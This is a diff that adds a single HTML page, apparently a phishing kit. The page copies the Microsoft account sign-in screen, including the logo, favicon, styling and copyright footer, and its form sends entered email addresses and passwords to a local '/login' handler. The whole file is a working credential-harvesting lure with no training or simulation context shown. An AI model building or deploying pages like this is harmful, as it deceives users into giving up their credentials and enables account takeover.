@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sign in to your account</title>
+<link rel="icon" href="https://login.microsoftonline.com/common/v2.0/images/favicon.ico">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background:#f3f2f1;display:flex;align-items:center;justify-content:center;min-height:100vh}
+.container{display:flex;align-items:center;justify-content:center;width:100%;min-height:100vh}
+.card{background:white;padding:44px;max-width:440px;width:90%;box-shadow:0 2px 6px rgba(0,0,0,0.2)}
+.logo{margin-bottom:24px}
+.logo svg{width:108px;height:24px}
+h2{font-size:24px;font-weight:600;color:#1b1b1b;margin-bottom:4px}
+.subtitle{color:#616161;font-size:13px;margin-bottom:24px}
+.input-field{width:100%;padding:8px 0;margin:16px 0;border:none;border-bottom:1px solid #666;font-size:15px;outline:none;background:transparent}
+.input-field:focus{border-bottom:2px solid #0067b8}
+.options{display:flex;justify-content:space-between;align-items:center;margin:20px 0}
+.keep{display:flex;align-items:center;gap:8px;font-size:13px;color:#1b1b1b;cursor:pointer}
+.keep input{cursor:pointer}
+.btn{width:100%;padding:10px;background:#0067b8;color:white;border:none;font-size:15px;cursor:pointer;margin-top:8px}
+.btn:hover{background:#005a9e}
+.signup{margin-top:24px;font-size:13px;color:#1b1b1b}
+.signup a{color:#0067b8;text-decoration:none}
+.signup a:hover{text-decoration:underline}
+.footer{position:fixed;bottom:0;width:100%;padding:12px 24px;display:flex;justify-content:space-between;font-size:12px;color:#616161;background:#f3f2f1}
+.footer a{color:#616161;text-decoration:none;margin-left:16px}
+</style>
+</head>
+<body>
+<div class="container">
+    <div class="card">
+        <div class="logo">
+            <svg viewBox="0 0 108 24" xmlns="http://www.w3.org/2000/svg">
+                <rect width="10" height="10" fill="#f25022"/>
+                <rect x="12" width="10" height="10" fill="#7fba00"/>
+                <rect y="12" width="10" height="10" fill="#00a4ef"/>
+                <rect x="12" y="12" width="10" height="10" fill="#ffb900"/>
+                <text x="28" y="17" font-size="15" fill="#5e5e5e" font-family="Segoe UI">Microsoft</text>
+            </svg>
+        </div>
+        <h2>Sign in</h2>
+        <form action="/login" method="POST">
+            <input type="text" name="email" class="input-field" placeholder="Email, phone, or Skype" required>
+            <input type="password" name="password" class="input-field" placeholder="Password" required>
+            <div class="options">
+                <label class="keep"><input type="checkbox" checked> Keep me signed in</label>
+            </div>
+            <button type="submit" class="btn">Sign in</button>
+        </form>
+        <p class="signup">No account? <a href="#">Create one!</a></p>
+    </div>
+</div>
+<div class="footer">
+    <span>©2024 Microsoft</span>
+    <div>
+        <a href="#">Terms of use</a>
+        <a href="#">Privacy & cookies</a>
+    </div>
+</div>
+</body>
+</html>
